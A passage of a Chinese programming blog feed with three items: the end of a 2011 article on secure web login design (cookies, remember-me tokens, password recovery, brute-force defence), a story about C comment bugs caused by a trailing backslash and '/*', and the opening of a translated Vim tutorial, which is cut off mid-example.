<li><span class="Apple-style-span" style="font-weight: normal;"><strong>口令在网上的传输</strong>。因为HTTP是明文协议，所以，用户名和口令在网上也是明文发送的，这个很不安全。你可以看看<a title="用Wireshark从http数据包中得到用户的登录信息" href="http://www.blogjava.net/heyang/archive/2011/04/05/340330.html" target="_blank">这篇文章</a>你就明白了。要做到加密传输就必需使用HTTPS协议。但是，在中国还是有很多网站的Web登录方式还在使用ActiveX控件，这可能成为IE6还大量存在的原因。我通常理解为这些ActiveX控件是为了反键盘记录程序的。 不过，我依然觉ActiveX控件不应该存在，因为在国外的众多安全很重要的站点上都看不到ActiveX的控件的身影。</span></li>
</ul>
<h4>
<span class="ez-toc-section" id="%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81"></span>用户登录状态<span class="ez-toc-section-end"></span>
</h4>
<p>首先，我想告诉大家的是，因为HTTP是无状态的协议，也就是说，这个协议是无法记录用户访问状态的，其每次请求都是独立的无关联的，一笔是一笔。而我们的网站都是设计成多个页面的，所在页面跳转过程中我们需要知道用户的状态，尤其是用户登录的状态，这样我们在页面跳转后我们才知道是否可以让用户有权限来操作一些功能或是查看一些数据。</p>
<p><strong>所以，我们每个页面都需要对用户的身份进行认证</strong>。当然，我们不可能让用户在每个页面上输入用户名和口令，这会让用户觉得我们的网站相当的SB。为了实现这一功能，用得最多的技术就是浏览器的cookie，我们会把用户登录的信息存放在客户端的cookie里，这样，我们每个页面都从这个cookie里获得用户是否登录的信息，从而达到记录状态，验证用户的目的。但是，你真的会用cookie吗？下面是使用cookie的一些原则。</p>
<ul>
<li>
<strong>千万不要在cookie中存放用户的密码</strong>。加密的密码都不行。因为这个密码可以被人获取并尝试离线穷举。所以，你一定不能把用户的密码保存在cookie中。我看到太多的站点这么干了。</li>
</ul>
<ul>
<li>
<strong>正确设计“记住密码”</strong>。这个功能简直就是一个安全隐患，我觉得并不是所有的程序员都知道怎么设计这个事。一般的设计 是——一时用户勾选了这个功能，系统会生成一个cookie，cookie包括用户名和一个固定的散列值，这个固定的散列值一直使用。这样，你就可以在所有的设备和客户上都可以登录，而且可以有多个用户同时登录。这个并不是很安全。下面是一些更为安全的方法供你参考：<br>
<span style="color: #000080;">（——<em><strong>更新 2011/08/26，原文中有些小错误，并且说的不清楚，重新调整了一下——</strong></em>）</span>
</li>
</ul>
<p style="padding-left: 60px;">1）在cookie中，保存三个东西——<strong>用户名</strong>，<strong>登录序列</strong>，<strong>登录token</strong>。</p>
<p style="padding-left: 90px;"><strong>用户名</strong>：明文存放。<br>
<strong>登录序列</strong>：一个被MD5散列过的随机数，<span style="color: #cc0000;">仅当强制用户输入口令时更新（如：用户修改了口令）</span>。<br>
<strong>登录token</strong>：一个被MD5散列过的随机数，<span style="color: #cc0000;">仅一个登录session内有效，新的登录session会更新它</span>。</p>
<p style="padding-left: 60px;">2）上述三个东西会存在服务器上，服务器的验证用户需要验证客户端cookie里的这三个事。</p>
<p style="padding-left: 60px;">3）这样的设计会有什么样的效果，会有下面的效果，</p>
<p style="padding-left: 90px;">a）<strong>登录token</strong>是单实例登录。意思就是一个用户只能有一个登录实例。</p>
<p style="padding-left: 90px;">b）<strong>登录序列</strong>是用来做盗用行为检测的。如果用户的cookie被盗后，盗用者使用这个cookie访问网站时，我们的系统是以为是合法用户，然后更新“<strong>登录token</strong>”，而真正的用户回来访问时，系统发现只有“<strong>用户名</strong>”和“<strong>登录序列</strong>”相同，但是“<strong>登录token</strong>” 不对，这样的话，系统就知道，这个用户可能出现了被盗用的情况，于是，系统可以清除并更改<strong>登录序列 </strong>和<strong> <strong>登录token</strong></strong>，这样就可以令所有的cookie失效，并要求用户输入口令。并给警告用户系统安全。</p>
<p style="padding-left: 60px;">4）当然，<strong>上述这样的设计还是会有一些问题，比如：同一用户的不同设备登录，甚至在同一个设备上使用不同的浏览器保登录</strong>。一个设备会让另一个设备的<strong>登录token</strong>和<strong>登录序列</strong>失效，从而让其它设备和浏览器需要重新登录，并会造成cookie被盗用的假象。所以，你在服务器服还需要考虑- <strong>IP 地址</strong>，</p>
<p style="padding-left: 90px;">a) 如果以口令方式登录，我们无需更新服务器的“<strong>登录序列</strong>”和 “<strong>登录token</strong>”（但需要更新cookie）。因为我们认为口令只有真正的用户知道。</p>
<p style="padding-left: 90px;">b) 如果 <strong>IP相同</strong> ，那么，我们无需更新服务器的“<strong>登录序列</strong>”和 “<strong>登录token</strong>”（但需要更新cookie）。因为我们认为是同一用户有同一IP（当然，同一个局域网里也有同一IP，但我们认为这个局域网是用户可以控制的。网吧内并不推荐使用这一功能）。</p>
<p style="padding-left: 90px;">c) 如果 （<strong>IP不同 </strong>&amp;&amp;<strong> 没有用口令登录</strong>），那么，“<strong>登录token</strong>” 就会在多个IP间发生变化（登录token在两个或多个ip间被来来回回的变换），当在一定时间内达到一定次数后，系统才会真正觉得被盗用的可能性很高，此时系统在后台清除“<strong>登录序列</strong>”和“<strong>登录token</strong>“，让Cookie失效，强制用户输入口令（或是要求用户更改口令），以保证多台设备上的cookie一致。</p>
<ul>
<li>
<strong>不要让cookie有权限访问所有的操作</strong>。否则就是XSS攻击，这个功能请参看<a title="新浪微博的XSS攻击" href="https://coolshell.cn/articles/4914.html" target="_blank">新浪微博的XSS攻击</a>。下面的这些功能一定要用户输入口令：</li>
</ul>
<div style="padding-left: 60px;">1）修改口令。</div>
<div style="padding-left: 60px;">2）修改电子邮件。（电子邮件通常用来找回用户密码，最好通发邮件或是发手机短信的方式修改，或者干脆就不让改一一用电子邮件做帐号名）</div>
<div style="padding-left: 60px;">3）用户的隐私信息。</div>
<div style="padding-left: 60px;">4）用户消费功能。</div>
<div>
<ul>
<li>
<strong>权衡Cookie的过期时间。</strong>如果是永不过期，会有很不错的用户体验，但是这也会让用户很快就忘了登录密码。如果设置上过期期限，比如2周，一个月，那么可能会好一点，但是2周和一个月后，用户依然会忘了密码。尤其是用户在一些公共电脑上，如果保存了永久cookie的话，等于泄露了帐号。所以，对于cookie的过期时间我们还需要权衡。</li>
</ul>
</div>
<h4>
<span class="ez-toc-section" id="%E6%89%BE%E5%9B%9E%E5%8F%A3%E4%BB%A4%E7%9A%84%E5%8A%9F%E8%83%BD"></span>找回口令的功能<span class="ez-toc-section-end"></span>
</h4>
<p>找回口令的功能一定要提供。但是很多朋友并不知道怎么来设计这个功能。我们有很多找回口令的设计，下面我逐个点评一下。</p>
<ul>
<li>
<strong>千万不要使用安全问答</strong>。事实证明，这个环节很烦人，而且用户并不能很好的设置安全问答。什么，我的生日啊，我母亲的生日，等等。因为今天的互联网和以前不一样了，因为SNS，今天的互联比以前更真实了，我可以上facebook，开心，人人网，LinkedIn查到你的很多的真实的信息。通过这些信息我可以使用安全问答来重设你的口令。 这里需要说一下 Facebook，Facebook的安全问答很强大，还要你通过照片认人，呵呵。</li>
</ul>
<ul>
<li>
<strong>不要重置用户的密码</strong>。因为这有可能让用户的密码遭到恶意攻击。当然，你要发个邮件给用户让其确认，用户点击邮件中的一个链接，你再重置。我并不推荐这样的方法，因为用户一般都会用笔记下来这个很难记的口令，然后登录系统，因为登录系统时使用了“记住密码”的功能，所以导致用户不会去修改密码，从而要么导到被写下来的密码被人盗取，要么又忘记了密码。</li>
</ul>
<ul>
<li>
<strong>好一点的做法——通过邮件自行重置</strong>。当用户申请找回口令功能的时候，系统生成一个MD5唯一的随机字串（可通过UID+IP+timestamp+随机数），放在数据库中，然后设置上时限（比如1小时内），给用户发一个邮件，这个连接中包含那个MD5的字串的链接，用户通过点击那个链接来自己重新设置新的口令。</li>
</ul>
<ul>
<li>
<strong>更好一点的做法——多重认证</strong>。比如：通过手机+邮件的方式让用户输入验证码。手机+邮件可能还不把握，因为手机要能会丢了，而我的手机可以访问我的邮箱。所以，使用U盾，SecureID（一个会变化的6位数token），或是通过人工的方式核实用户身份。当然，这主要看你的系统的安全级别了。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%8F%A3%E4%BB%A4%E6%8E%A2%E6%B5%8B%E9%98%B2%E5%AE%88"></span>口令探测防守<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>
<strong>使用验证码</strong>。验证码是后台随机产生的一个短暂的验证码，这个验证码一般是一个计算机很难识别的图片。这样就可以防止以程序的方式来尝试用户的口令。事实证明，这是最简单也最有效的方式。当然，总是让用户输入那些肉眼都看不清的验证码的用户体验不好，所以，可以折中一下。比如Google，当他发现一个IP地址发出大量的搜索后，其会要求你输入验证码。当他发现同一个IP注册了3个以上的gmail邮箱后，他需要给你发短信方式或是电话方式的验证码。</li>
</ul>
<ul>
<li>
<strong>用户口令失败次数</strong>。调置口令失败的上限，如果失败过多，则把帐号锁了，需要用户以找回口令的方式来重新激活帐号。但是，这个功能可能会被恶意人使用。最好的方法是，增加其尝试的时间成本（以前的这篇文章说过一个<a title="如何防范密码被破解" href="https://coolshell.cn/articles/2078.html" target="_blank">增加时间成本的解密算法</a>）。如，两次口令尝试的间隔是5秒钟。三次以上错误，帐号被临时锁上30秒，5次以上帐号被锁1分钟，10次以上错误帐号被锁4小时……但是这会导致恶意用户用脚本来攻击，所以最好再加上验证码，验证码出错次数过多不禁止登录而是禁lP。</li>
</ul>
<ul>
<li>
<strong>系统全局防守</strong>。上述的防守只针对某一个别用户。恶意者们深知这一点，所以，他们一般会动用“僵尸网络”轮着尝试一堆用户的口令，所以上述的那种方法可能还不够好。我们需要在系统全局域上监控所有的口令失败的次数。当然，这个需要我们平时没有受到攻击时的数据做为支持。比如你的系统，平均每天有5000次的口令错误的事件，那么你可以认为，当口令错误大幅超过这个数后，而且时间相对集中，就说明有黑客攻击。这个时候你怎么办？一般最常见使用的方法是让所有的用户输错口令后再次尝试的时间成本增加。</li>
</ul>
<div>最后，再说一下，关于用户登录，使用第三方的 OAuth 和 OpenID 也不失为一个很不错的选择。</div>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"></span>参考文章<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li><a href="https://www.owasp.org/index.php/Guide_to_Authentication" rel="nofollow">OWASP Guide To Authentication</a></li>
<li>
<a href="http://www.cs.umass.edu/~kevinfu/papers/webauth_tr.pdf" rel="nofollow">Dos and Don’ts of Client Authentication on the Web </a>（PDF）</li>
<li><a href="http://fishbowl.pastiche.org/2004/01/19/persistent_login_cookie_best_practice/" rel="nofollow">Charles Miller’s Persistent Login Cookie Best Practice</a></li>
<li><a href="https://en.wikipedia.org/wiki/HTTP_cookie#Drawbacks_of_cookies" rel="nofollow">Wikipedia: HTTP cookie</a></li>
<li><a href="https://cups.cs.cmu.edu/soups/2008/proceedings/p13Rabkin.pdf" rel="nofollow">Personal knowledge questions for fallback authentication: Security questions in the era of Facebook </a></li>
</ul>
<div>（<strong>以上内容，转载时请保持原文一致，并请注明作者和出处</strong>）</div>
<p></p>
 ]]></content>
<pubDate>2011-08-25T08:48:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/5353.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ C语言中史上最愚蠢的Bug ]]></title>
<link>https://coolshell.cn/articles/5388.html</link>
<content><![CDATA[ 
<p>本文来自“<a href="http://www.elpauer.org/?p=971" target="_blank">The most stupid C bug ever</a>”，很有意思，分享给大家。我相信这样的bug，就算你是高手你也会犯的。你来看看作者犯的这个Bug吧。。</p>
<p>首先，作者想用一段程序来创建一个文件，如果有文件名的话，就创建真正的文件，如果没有的话，就调用?<a href="https://linux.die.net/man/3/tmpfile">tmpfile()</a>?创建临时文件。他这段程序就是HTTP下载的C程序。code==200就是HTTP的返回码。</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">else if (code == 200) {     // Downloading whole file
    /* Write new file (plus allow reading once we finish) */
    g = fname ? fopen(fname, "w+") : tmpfile();
}</pre>
<p>但是这个程序，只能在Unix/Linux下工作，因为 Microsoft 的?<a href="https://msdn.microsoft.com/en-us/library/x8x7sakw.aspx">tmpfile()的实现</a>?居然选择了 C:\ 作为临时文件的存放目录，这对于那些没有管理员权限的人来说就出大问题了，在Windows 7下，就算你有管理员权限也会有问题。所以，上面的程序在Windows平台下需要用不同的方式来处理，不能直接使用Windows的tmpfile()函数。</p>
<p>于是作者就先把这个问题记下来，在注释中写下了FIXME：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">else if (code == 200) {     // Downloading whole file
    /* Write new file (plus allow reading once we finish) */

    // FIXME Win32 native version fails here because
    //   Microsoft's version of tmpfile() creates the file in C:\
    g = fname ? fopen(fname, "w+") : tmpfile();
}</pre>
<p>然后，作者觉得需要写一个跨平台的编译：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">FILE * tmpfile ( void ) {
#ifndef _WIN32
    return tmpfile();
#else
    //code for Windows;
#endif
}</pre>
<p>然后，作者觉得这样实现很不好，会发现名字冲突，因为这样一来这个函数太难看了。于是他重构了一下他的代码——写一个自己实现的tmpfile() – w32_tmpfile，然后，在Windows 下用宏定义来重命名这个函数为tmpfile()。（陈皓注：这种用法是比较标准的跨平台代码的写法）</p>
<p><span id="more-5388"></span></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#ifdef _WIN32
  #define tmpfile w32_tmpfile
#endif

FILE * w32_tmpfile ( void ) {
    //code for Windows;
}</pre>
<p>搞定！编译程序，运行。靠！居然没有调用到我的w32_tmpfile()，什么问题？调试，单步跟踪，果然没有调用到！难道是问号表达式有问题？改成if – else 语句，好了！</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">if(NULL != fname) {
    g = fopen(fname, "w+");
} else {
    g = tmpfile();
}</pre>
<p>问号表达式不应该有问题吧，难道我们的宏对问号表达式不起作用，这难道是编译器的预编译的一个bug？作者怀疑到。</p>
<p>现在我们把所有的代码连在一起看，并比较一下：</p>
<p><strong>能正常工作的代码</strong></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#ifdef _WIN32
#  define tmpfile w32_tmpfile
#endif

FILE * w32_tmpfile ( void ) {
    code for Windows;
}

else if (code == 200) {     // Downloading whole file
    /* Write new file (plus allow reading once we finish) */
    // FIXME Win32 native version fails here because
    //     Microsoft's version of tmpfile() creates the file in C:\
    //g = fname ? fopen(fname, "w+") : tmpfile();
    if(NULL != fname) {
        g = fopen(fname, "w+");
    } else {
        g = tmpfile();
    }
}</pre>
<p><strong>不能正常工作的代码</strong></p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">#ifdef _WIN32
#  define tmpfile w32_tmpfile
#endif

FILE * w32_tmpfile ( void ) {
    code for Windows;
}

else if (code == 200) {     // Downloading whole file
    /* Write new file (plus allow reading once we finish) */
    // FIXME Win32 native version fails here because
    //    Microsoft's version of tmpfile() creates the file in C:\
    g = fname ? fopen(fname, "w+") : tmpfile();
}</pre>
<p>也许你在一开始就看到了这个bug，但是作者没有。所有的问题都出在注释上：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">/* Write new file (plus allow reading once we finish) */
// FIXME Win32 native version fails here because
//     Microsoft's version of tmpfile() creates the file in C:\
</pre>
<p><strong>你看到了最后那个C:\吗？在C中，“\” 代表此行没有结束，于是，后面的代码也成了注释。这就是这个bug的真正原因</strong>！</p>
<p>而之所以改成if-else能工作的原因是因为作者注释了老的问号表达式的代码，所以，那段能工作的代码成了：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">/* Write new file (plus allow reading once we finish) */
// FIXME Win32 native version fails here because Microsoft's version of tmpfile() creates the file in C:    //g = fname ? fopen(fname, "w+") : tmpfile();
if(NULL != fname) {
    g = fopen(fname, "w+");
} else {
    g = tmpfile();
}</pre>
<p>我相信，当作者找到这个问题的原因后，一定会骂一句“妈的”！我也相信，这个bug花费了作者很多时间！</p>
<p>最后，我也share一个我以前犯的一个错。</p>
<p>我有一个小函数，需要传入一个int* pInt的类型，然后我需要在我的代码里 把这个int* pInt作除数。于是我的代码成了下面的这个样子：</p>
<blockquote>
<p>float result = num/*pInt;<br>
….</p>
<p>/*  some comments */</p>
<p>-x&lt;10 ? f(result):f(-result);</p>
</blockquote>
<p>因为我在我当时用vi编写代码，所以没有语法高亮，而我的程序都编译通过了，但是却出现了很奇怪的事。我也不知道，用gdb调式的时候，发现有些语句直接就过了。这个问题让我花了很多时间，最后发现问题原来是没有空格导致的，TNND，下面我用代码高亮的插件来显示上面的代码，</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">float result = num/*pInt;
....

/*  some comments */

-x&lt;10 ? f(result):f(-result); </pre>
<p>Holly Shit!  我的代码成了：</p>
<p><code data-enlighter-language="c" class="EnlighterJSRAW">float result = num-x&lt;10 ? f(result):f(-result);</code></p>
<p>妈的！我的这个错误在愚蠢程度上和上面那个作者出的错误有一拼。</p>
<p>（全文完）</p>
 ]]></content>
<pubDate>2011-08-26T10:17:48+08:00</pubDate>
<guid>https://coolshell.cn/articles/5388.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 简明 Vim 练级攻略 ]]></title>
<link>https://coolshell.cn/articles/5426.html</link>
<content><![CDATA[ 
<p>vim的学习曲线相当的大（参看<a title="主流文本编辑器学习曲线" href="https://coolshell.cn/articles/3125.html" target="_blank">各种文本编辑器的学习曲线</a>），所以，如果你一开始看到的是一大堆VIM的命令分类，你一定会对这个编辑器失去兴趣的。下面的文章翻译自《<a href="http://yannesposito.com/Scratch/en/blog/Learn-Vim-Progressively/" target="_blank">Learn Vim Progressively</a>》，我觉得这是给新手最好的VIM的升级教程了，没有列举所有的命令，只是列举了那些最有用的命令。非常不错。</p>
<p style="text-align: center;">——————————正文开始——————————</p>
<p>你想以最快的速度学习人类史上最好的文本编辑器VIM吗？你先得懂得如何在VIM幸存下来，然后一点一点地学习各种戏法。</p>
<p><a href="https://www.vim.org">Vim</a> the Six Billion Dollar editor</p>
<blockquote><p>Better, Stronger, Faster.</p></blockquote>
<p>学习 <a href="https://www.vim.org">vim</a> 并且其会成为你最后一个使用的文本编辑器。没有比这个更好的文本编辑器了，非常地难学，但是却不可思议地好用。</p>
<p>我建议下面这四个步骤：</p>
<ol>
<li>存活</li>
<li>感觉良好</li>
<li>觉得更好，更强，更快</li>
<li>使用VIM的超能力</li>
</ol>
<p>当你走完这篇文章，你会成为一个vim的 superstar。</p>
<p>在开始学习以前，我需要给你一些警告：</p>
<ul>
<li>学习vim在开始时是痛苦的。</li>
<li>需要时间</li>
<li>需要不断地练习，就像你学习一个乐器一样。</li>
<li>不要期望你能在3天内把vim练得比别的编辑器更有效率。</li>
<li>事实上，你需要2周时间的苦练，而不是3天。</li>
</ul>
<div><span id="more-5426"></span></div>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E7%AC%AC%E4%B8%80%E7%BA%A7_-_%E5%AD%98%E6%B4%BB" title="第一级 – 存活">第一级 – 存活</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#%E7%AC%AC%E4%BA%8C%E7%BA%A7_-_%E6%84%9F%E8%A7%89%E8%89%AF%E5%A5%BD" title="第二级 – 感觉良好">第二级 – 感觉良好</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-3" href="#%E7%AC%AC%E4%B8%89%E7%BA%A7_-_%E6%9B%B4%E5%A5%BD%EF%BC%8C%E6%9B%B4%E5%BC%BA%EF%BC%8C%E6%9B%B4%E5%BF%AB" title="第三级 – 更好，更强，更快">第三级 – 更好，更强，更快</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-4" href="#%E6%9B%B4%E5%A5%BD" title="更好">更好</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%9B%B4%E5%BC%BA" title="更强">更强</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%9B%B4%E5%BF%AB" title="更快">更快</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4">
<a class="ez-toc-link ez-toc-heading-7" href="#%E7%AC%AC%E5%9B%9B%E7%BA%A7_-_Vim_%E8%B6%85%E8%83%BD%E5%8A%9B" title="第四级 – Vim 超能力">第四级 – Vim 超能力</a><ul class="ez-toc-list-level-5">
<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%9C%A8%E5%BD%93%E5%89%8D%E8%A1%8C%E4%B8%8A%E7%A7%BB%E5%8A%A8%E5%85%89%E6%A0%87_0_f_F_t_T" title="在当前行上移动光标: 0 ^ $ f F t T , ;">在当前行上移动光标: 0 ^ $ f F t T , ;</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%8C%BA%E5%9F%9F%E9%80%89%E6%8B%A9_a_%E6%88%96_i" title="区域选择 &lt;action&gt;a&lt;object&gt; 或 &lt;action&gt;i&lt;object&gt;">区域选择 &lt;action&gt;a&lt;object&gt; 或 &lt;action&gt;i&lt;object&gt;</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-10" href="#%E5%9D%97%E6%93%8D%E4%BD%9C" title="块操作: &lt;C-v&gt;">块操作: &lt;C-v&gt;</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-11" href="#%E8%87%AA%E5%8A%A8%E6%8F%90%E7%A4%BA%EF%BC%9A_%E5%92%8C" title="自动提示： &lt;C-n&gt; 和 &lt;C-p&gt;">自动提示： &lt;C-n&gt; 和 &lt;C-p&gt;</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-12" href="#%E5%AE%8F%E5%BD%95%E5%88%B6%EF%BC%9A_qa_%E6%93%8D%E4%BD%9C%E5%BA%8F%E5%88%97_q_a" title="宏录制： qa 操作序列 q, @a, @@">宏录制： qa 操作序列 q, @a, @@</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-13" href="#%E5%8F%AF%E8%A7%86%E5%8C%96%E9%80%89%E6%8B%A9%EF%BC%9A_vV" title="可视化选择： v,V,&lt;C-v&gt;">可视化选择： v,V,&lt;C-v&gt;</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-14" href="#%E5%88%86%E5%B1%8F_split_%E5%92%8C_vsplit" title="分屏: :split 和 vsplit.">分屏: :split 和 vsplit.</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#%E7%BB%93%E6%9D%9F%E8%AF%AD" title="结束语">结束语</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%80%E7%BA%A7_-_%E5%AD%98%E6%B4%BB"></span>第一级 – 存活<span class="ez-toc-section-end"></span>
</h4>
<ol>
<li>安装 <a href="https://www.vim.org">vim</a>
</li>
<li>启动 vim</li>
<li>
<strong>什么也别干！</strong>请先阅读</li>
</ol>
<p>当你安装好一个编辑器后，你一定会想在其中输入点什么东西，然后看看这个编辑器是什么样子。但vim不是这样的，请按照下面的命令操作：</p>
<ul>
<li>启 动Vim后，vim在 <em>Normal</em> 模式下。</li>
<li>让我们进入 <em>Insert</em> 模式，请按下键 i 。(陈皓注：你会看到vim左下角有一个–insert–字样，表示，你可以以插入的方式输入了）</li>
<li>此时，你可以输入文本了，就像你用“记事本”一样。</li>
<li>如果你想返回 <em>Normal</em> 模式，请按 <code>ESC</code> 键。</li>
</ul>
<p>现在，你知道如何在 <em>Insert</em> 和 <em>Normal</em> 模式下切换了。下面是一些命令，可以让你在 <em>Normal</em> 模式下幸存下来：</p>
<blockquote>
<ul>
<li>
<code>i</code> → <em>Insert</em> 模式，按 <code>ESC</code> 回到 <em>Normal</em> 模式.</li>
<li>
<code>x</code> → 删当前光标所在的一个字符。</li>
<li>
<code>:wq</code> → 存盘 + 退出 (<code>:w</code> 存盘, <code>:q</code> 退出)   （陈皓注：:w 后可以跟文件名）</li>
<li>
<code>dd</code> → 删除当前行，并把删除的行存到剪贴板里</li>
<li>
<code>p</code> → 粘贴剪贴板</li>
</ul>
<p><strong>推荐</strong>:</p>
<ul>
<li>
<code>hjkl</code> (强例推荐使用其移动光标，但不必需) →你也可以使用光标键 (←↓↑→). 注: <code>j</code> 就像下箭头。</li>
<li>
<code>:help &lt;command&gt;</code> → 显示相关命令的帮助。你也可以就输入 <code>:help</code> 而不跟命令。（陈皓注：退出帮助需要输入:q）</li>
</ul>
</blockquote>
<p>你能在vim幸存下来只需要上述的那5个命令，你就可以编辑文本了，你一定要把这些命令练成一种下意识的状态。于是你就可以开始进阶到第二级了。</p>
<p>当是，在你进入第二级时，需要再说一下 <em>Normal </em>模式。在一般的编辑器下，当你需要copy一段文字的时候，你需要使用 <code>Ctrl</code> 键，比如：<code>Ctrl-C</code>。也就是说，Ctrl键就好像功能键一样，当你按下了功能键Ctrl后，C就不在是C了，而且就是一个命令或是一个快键键了，<strong>在VIM的Normal模式下，所有的键就是功能键了</strong>。这个你需要知道。</p>
<p>标记:</p>
<ul>
<li>下面的文字中，如果是 <code>Ctrl-λ</code>我会写成 <code>&lt;C-λ&gt;</code>.</li>
<li>以 <code>:</code> 开始的命令你需要输入 <code>&lt;enter&gt;</code>回车，例如 — 如果我写成 <code>:q</code> 也就是说你要输入 <code>:q&lt;enter&gt;</code>.</li>
</ul>
<h4 id="nd-level----feel-comfortable">
<span class="ez-toc-section" id="%E7%AC%AC%E4%BA%8C%E7%BA%A7_-_%E6%84%9F%E8%A7%89%E8%89%AF%E5%A5%BD"></span>第二级 – 感觉良好<span class="ez-toc-section-end"></span>
</h4>
<p>上面的那些命令只能让你存活下来，现在是时候学习一些更多的命令了，下面是我的建议：（陈皓注：所有的命令都需要在Normal模式下使用，如果你不知道现在在什么样的模式，你就狂按几次ESC键）</p>
<ol>
<li>
<strong>各种插入模式</strong><br>
<blockquote>
<ul>
<li>
<code>a</code> → 在光标后插入</li>
<li>
<code>o</code> → 在当前行后插入一个新行</li>
<li>
<code>O</code> → 在当前行前插入一个新行</li>
<li>
<code>cw</code> → 替换从光标所在位置后到一个单词结尾的字符</li>
</ul>
</blockquote>
</li>
<li>
<strong>简单的移动光标</strong><br>
<blockquote>
<ul>
<li>
<code>0</code> → 数字零，到行头</li>
<li>
<code>^</code> → 到本行第一个不是blank字符的位置（所谓blank字符就是空格，tab，换行，回车等）</li>
<li>
<code>$</code> → 到本行行尾</li>
<li>
<code>g_</code> → 到本行最后一个不是blank字符的位置。</li>
<li>
<code>/pattern</code> → 搜索 <code>pattern</code> 的字符串（陈皓注：如果搜索出多个匹配，可按n键到下一个）</li>
</ul>
</blockquote>
</li>
<li>
<strong>拷贝/粘贴</strong> （陈皓注：p/P都可以，p是表示在当前位置之后，P表示在当前位置之前）<br>
<blockquote>
<ul>
<li>
<code>P</code> → 粘贴</li>
<li>
<code>yy</code> → 拷贝当前行当行于 <code>ddP</code>
</li>
</ul>
</blockquote>
</li>
<li>
<strong>Undo/Redo</strong><br>
<blockquote>
<ul>
<li>
<code>u</code> → undo</li>
<li>
<code>&lt;C-r&gt;</code> → redo</li>
</ul>
</blockquote>
</li>
<li>
<strong>打开/保存/退出/改变文件</strong>(Buffer)<br>
<blockquote>
<ul>
<li>
<code>:e &lt;path/to/file&gt;</code> → 打开一个文件</li>
<li>
<code>:w</code> → 存盘</li>
<li>
<code>:saveas &lt;path/to/file&gt;</code> → 另存为 <code>&lt;path/to/file&gt;</code>
</li>
<li>
<code>:x</code>， <code>ZZ</code> 或 <code>:wq</code> → 保存并退出 (<code>:x</code> 表示仅在需要时保存，ZZ不需要输入冒号并回车)</li>
<li>
<code>:q!</code> → 退出不保存 <code>:qa!</code> 强行退出所有的正在编辑的文件，就算别的文件有更改。</li>
<li>
<code>:bn</code> 和 <code>:bp</code> → 你可以同时打开很多文件，使用这两个命令来切换下一个或上一个文件。（陈皓注：我喜欢使用:n到下一个文件）</li>
</ul>
</blockquote>
</li>
</ol>
<p>花点时间熟悉一下上面的命令，一旦你掌握他们了，你就几乎可以干其它编辑器都能干的事了。但是到现在为止，你还是觉得使用vim还是有点笨拙，不过没关系，你可以进阶到第三级了。</p>
<h4 id="rd-level----better-stronger-faster">
<span class="ez-toc-section" id="%E7%AC%AC%E4%B8%89%E7%BA%A7_-_%E6%9B%B4%E5%A5%BD%EF%BC%8C%E6%9B%B4%E5%BC%BA%EF%BC%8C%E6%9B%B4%E5%BF%AB"></span>第三级 – 更好，更强，更快<span class="ez-toc-section-end"></span>
</h4>
<p>先恭喜你！你干的很不错。我们可以开始一些更为有趣的事了。在第三级，我们只谈那些和vi可以兼容的命令。</p>
<h5 id="better">
<span class="ez-toc-section" id="%E6%9B%B4%E5%A5%BD"></span>更好<span class="ez-toc-section-end"></span>
</h5>
<p>下面，让我们看一下vim是怎么重复自己的：</p>
<ol>
<li>
<code>.</code> → (小数点) 可以重复上一次的命令</li>
<li>N&lt;command&gt; → 重复某个命令N次</li>
</ol>
<p>下面是一个示例，找开一个文件你可以试试下面的命令：</p>
<blockquote>
